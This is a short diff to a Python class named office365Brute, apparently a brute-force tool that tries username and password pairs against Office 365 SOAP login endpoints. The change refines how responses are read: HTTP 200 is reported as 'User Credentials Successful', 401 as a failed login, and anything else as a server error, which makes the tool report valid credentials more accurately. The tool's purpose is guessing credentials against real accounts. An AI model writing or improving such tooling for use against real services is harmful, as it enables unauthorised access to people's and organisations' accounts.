@@ -45,10 +45,13 @@ class office365Brute():
 </soap:Envelope>""".format()
 
         (status, data) = self.buildConn(request, user, password, config["HOST"], url)
+        if (int(status) == 200):
+            print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
+            return
         if (int(status) == 401):
             print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
             return
-        print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
+        print("[-]  Received error from remote server")
 
     def payload(self, config):
         if config["UserFile"]:
